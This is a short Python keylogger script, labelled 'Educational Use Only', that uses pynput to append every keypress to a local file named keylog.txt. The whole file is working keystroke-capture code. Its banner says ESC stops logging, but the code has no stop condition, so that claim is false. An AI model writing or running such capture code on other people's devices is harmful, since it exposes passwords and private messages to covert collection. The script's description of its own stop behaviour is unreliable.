from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"[{key}]")

def main():
    print("=== Simple Keylogger (Educational Use Only) ===")
    print("Keys will be logged into keylog.txt. Press ESC to stop.")
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()